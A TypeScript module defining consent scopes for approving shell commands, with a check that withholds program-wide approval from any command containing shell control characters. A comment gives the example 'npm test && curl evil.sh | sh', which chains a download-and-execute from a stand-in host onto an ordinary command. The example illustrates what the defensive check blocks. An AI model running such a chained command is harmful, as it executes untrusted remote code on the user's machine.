/**
 * Command approval scopes (pure).
 *
 * A per-action approval prompt for every command is correct but exhausting: a user
 * running `npm test` twenty times in one session answers the same question twenty
 * times, and habitual clicking is how real approval fatigue turns a safety feature
 * into a rubber stamp. So the prompt offers to REMEMBER a decision — but only at
 * scopes narrow enough that remembering cannot become a blank cheque.
 *
 * Deliberately absent: an "allow every command in this folder" scope. That would be
 * a blanket execution bypass, which is the one thing the approval boundary exists
 * to prevent. `program` scope is the widest offered, and it is still bound to one
 * executable in one workspace.
 *
 * Pure: no I/O, no Electron.
 */

/** How long an approval decision should be remembered for. */
export type CommandConsentScope =
  /** This invocation only. Nothing is stored. */
  | 'once'
  /** This exact command line, in this workspace. */
  | 'command'
  /** Any invocation of this program, in this workspace. */
  | 'program';

export const COMMAND_CONSENT_SCOPES: readonly CommandConsentScope[] = ['once', 'command', 'program'];

export function parseCommandConsentScope(value: unknown): CommandConsentScope {
  return typeof value === 'string' && (COMMAND_CONSENT_SCOPES as readonly string[]).includes(value)
    ? (value as CommandConsentScope)
    : 'once';
}

/**
 * Canonical form of a command line for exact-match comparison. Only surrounding and
 * repeated whitespace is normalized — nothing is reordered, unquoted, or otherwise
 * reinterpreted, so a remembered command can never match a different one.
 */
export function normalizeCommandLine(command: string): string {
  return command.replace(/\s+/g, ' ').trim();
}

/** Characters that let one command line become several, or reach the shell itself. */
const SHELL_CONTROL = /[&|;<>`$(){}\n\r]/;

/**
 * The program a command invokes, or null when that cannot be determined safely.
 *
 * A command containing shell control characters has NO single program — `npm test
 * && curl evil.sh | sh` invokes several — so it is refused for `program` scope
 * rather than attributed to its first word. This is the check that stops "always
 * allow npm" from authorising anything chained after an npm call.
 */
export function commandProgram(command: string): string | null {
  const normalized = normalizeCommandLine(command);
  if (normalized.length === 0 || SHELL_CONTROL.test(normalized)) return null;
  const first = normalized.split(' ')[0] ?? '';
  // A quoted or path-qualified executable is accepted, but only as written.
  const cleaned = first.replace(/^["']|["']$/g, '');
  if (cleaned.length === 0 || cleaned.length > 128) return null;
  if (!/^[A-Za-z0-9_.:\\/+-]+$/.test(cleaned)) return null;
  return cleaned;
}

/**
 * Which scopes may be offered for this command.
 *
 * `program` is withheld when the command is not a single program invocation, so the
 * UI never presents an option that would be unsafe to honour.
 */
export function offerableScopes(command: string): CommandConsentScope[] {
  const scopes: CommandConsentScope[] = ['once', 'command'];
  if (commandProgram(command) !== null) scopes.push('program');
  return scopes;
}
